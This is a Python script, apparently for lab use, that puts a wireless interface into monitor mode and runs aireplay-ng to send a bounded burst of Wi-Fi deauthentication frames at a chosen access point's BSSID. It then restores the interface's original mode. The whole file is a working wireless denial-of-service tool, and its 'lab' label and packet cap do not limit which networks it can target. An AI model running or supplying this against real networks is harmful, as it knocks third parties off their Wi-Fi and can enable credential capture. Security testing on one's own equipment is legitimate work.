#!/usr/bin/env python3
"""Finite lab deauth probe with monitor-mode setup and guaranteed restoration."""
import argparse
import re
import signal
import subprocess
import sys


def run(command, check=True):
    result = subprocess.run(command, capture_output=True, text=True, timeout=10)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout).strip() or "command failed")
    return result.stdout


def interface_type(iface):
    match = re.search(r"^\s*type\s+(\S+)", run(["iw", "dev", iface, "info"]), re.MULTILINE)
    if not match:
        raise RuntimeError(f"cannot determine interface type: {iface}")
    return match.group(1)


def set_type(iface, mode):
    run(["ip", "link", "set", iface, "down"])
    try:
        run(["iw", "dev", iface, "set", "type", mode])
    finally:
        run(["ip", "link", "set", iface, "up"])


def execute(iface, bssid, channel, count):
    original = interface_type(iface)
    changed = original != "monitor"
    process = None
    try:
        if changed:
            set_type(iface, "monitor")
        run(["iw", "dev", iface, "set", "channel", str(channel)])
        process = subprocess.Popen(
            ["aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        for line in process.stdout:
            print(line.rstrip(), flush=True)
        return process.wait()
    finally:
        if process is not None and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
        if changed:
            set_type(iface, original)


def interrupt(_signum, _frame):
    raise KeyboardInterrupt


def main(argv=None):
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True)
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--channel", required=True, type=int, choices=range(1, 234))
    parser.add_argument("--count", type=int, default=50, choices=range(1, 201))
    args = parser.parse_args(argv)
    if not re.fullmatch(r"[A-Za-z0-9_.:-]+", args.interface):
        parser.error("invalid interface")
    if not re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", args.bssid):
        parser.error("invalid BSSID")
    return execute(args.interface, args.bssid.lower(), args.channel, args.count)


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, interrupt)
    signal.signal(signal.SIGINT, interrupt)
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
    except (OSError, subprocess.SubprocessError, RuntimeError) as exc:
        print(f"[error] {exc}", file=sys.stderr)
        sys.exit(1)
